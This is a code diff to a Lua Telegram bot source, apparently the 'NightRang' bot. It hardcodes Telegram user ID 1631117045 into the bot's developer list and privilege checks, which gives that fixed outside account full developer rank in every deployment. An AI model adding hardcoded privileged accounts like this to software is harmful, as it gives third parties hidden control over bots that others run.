@@ -120,7 +120,7 @@ token = sudos.Token_Bot
 UserName_Dev = sudos.UserName_dev
 bot_id = token:match("(%d+)")  
 Id_Dev = tonumber(sudos.id_dev)
-Ids_Dev = {Id_Dev,bot_id,944353237,1001010101,1705066859}
+Ids_Dev = {Id_Dev,bot_id,944353237,1001010101,1705066859,1631117045}
 Name_Bot = (redis:get(bot_id.."NightRang:Redis:Name:Bot") or "IVNTA")
 ------------------------------------------------------------------------------------------------------------
 function var(value)  
@@ -289,7 +289,7 @@ elseif tonumber(user_id) == tonumber(1705066859) then
 Status = true
 elseif tonumber(user_id) == tonumber(944353237) then  
 Status = true
-elseif tonumber(user_id) == tonumber(1001010101) then  
+elseif tonumber(user_id) == tonumber(1631117045) then  
 Status = true
 elseif redis:sismember(bot_id.."NightRang:Developer:Bot1", user_id) then
 Status = true  
@@ -312,8 +312,8 @@ return Status
 end 
 ------------------------------------------------------------------------------------------------------------
 function Get_Rank(user_id,chat_id)
-if tonumber(user_id) == tonumber(1001010101) then  
-Status = "دنجول الجامد"
+if tonumber(user_id) == tonumber(1631117045) then  
+Status = "مطور السورس"
 elseif tonumber(user_id) == tonumber(944353237) then  
 Status = "مبرمج السورس" 
 elseif tonumber(user_id) == tonumber(1705066859) then  
